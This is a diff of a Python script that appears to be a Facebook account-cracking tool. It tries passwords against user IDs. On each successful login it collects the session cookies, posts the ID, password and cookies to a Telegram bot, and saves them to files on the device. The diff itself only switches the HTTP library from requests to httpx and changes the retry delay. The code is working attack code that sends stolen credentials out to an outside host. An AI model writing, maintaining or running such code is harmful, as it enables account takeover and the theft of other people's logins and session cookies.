@@ -741,13 +741,13 @@ def m1(ids,pwv):
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
-                res = requests.get(ckk).text
+                res = httpx.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {kuki} ")
-                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                        httpx.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                         oks.append(cid)
                         break
@@ -762,8 +762,8 @@ def m1(ids,pwv):
                 continue
             time.sleep(0.01)
         loop+=1
-    except requests.exceptions.ConnectionError:
-        time.sleep(7)
+    except httpx.HTTPError:
+        time.sleep(30)
     except Exception as e:
         pass
 
